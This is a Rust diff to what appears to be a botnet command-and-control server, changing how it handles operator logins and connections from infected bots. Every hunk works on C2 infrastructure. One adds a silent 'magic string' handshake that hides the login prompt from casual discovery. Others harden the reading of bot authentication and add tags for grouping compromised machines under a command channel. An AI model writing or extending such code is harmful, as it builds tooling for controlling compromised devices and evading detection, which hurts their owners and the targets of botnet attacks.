@@ -139,6 +139,15 @@ where
     let auth_timeout = Duration::from_secs(60);
     
     tokio::time::timeout(auth_timeout, async {
+        let magic_string = state.config.read().await.login_magic_string.clone();
+        if !magic_string.is_empty() {
+            // Magic string check - silent, no prompt
+            let input = read_input_masked(conn, true).await?;
+            if input != magic_string {
+                return Err(CncError::AuthFailed("Invalid handshake".to_string()));
+            }
+        }
+
         for attempt in 1..=3 {
             conn.write_all(b"\x1b[0m\r\n\r\n\r\n\r\n\r\n\r\n\r\n").await?;
             // ... (UI code omitted for brevity, but we should use the theme here if possible, 
@@ -249,11 +258,14 @@ pub async fn handle_bot_connection(conn: TcpStream, addr: std::net::SocketAddr, 
     let bot_auth_timeout = Duration::from_secs(state.config.read().await.bot_auth_timeout_secs);
     let (reader, mut writer) = tokio::io::split(conn);
     let mut reader = BufReader::new(reader);
-    let mut auth_line = String::new();
     
-    match tokio::time::timeout(bot_auth_timeout, reader.read_line(&mut auth_line)).await {
-        Ok(Ok(n)) if n > 0 => {},
-        _ => {
+    let auth_line = match tokio::time::timeout(bot_auth_timeout, read_line_bounded(&mut reader, 1024)).await {
+        Ok(Ok(line)) => line,
+        Ok(Err(e)) => {
+            warn!("Bot auth read error from {}: {}", addr, e);
+            return Ok(());
+        }
+        Err(_) => {
             warn!("Bot auth timeout or empty from {}", addr);
             return Ok(());
         }
@@ -285,8 +297,8 @@ pub async fn handle_bot_connection(conn: TcpStream, addr: std::net::SocketAddr, 
         "unknown".to_string()
     };
 
-    let (authenticated_bot_id, arch) = match state.bot_manager.verify_bot_token(auth_parts[1]).await {
-        Some((id, arch)) => (id, arch),
+    let (authenticated_bot_id, arch, tags) = match state.bot_manager.verify_bot_token(auth_parts[1]).await {
+        Some((id, arch, tags)) => (id, arch, tags),
         None => {
             warn!("Invalid bot auth token from {}: {}", addr, auth_parts[1]);
             let _ = writer.write_all(b"AUTH_FAILED\n").await;
@@ -313,7 +325,7 @@ pub async fn handle_bot_connection(conn: TcpStream, addr: std::net::SocketAddr, 
 
     let (cmd_tx, mut cmd_rx) = tokio::sync::mpsc::channel::<String>(100);
     let bot_arch = arch.clone();
-    let bot = Bot::new(addr, arch, version, cmd_tx);
+    let bot = Bot::new(addr, arch, version, tags, cmd_tx);
     {
         let mut info = bot.info.lock().await;
         info.id = authenticated_bot_id;
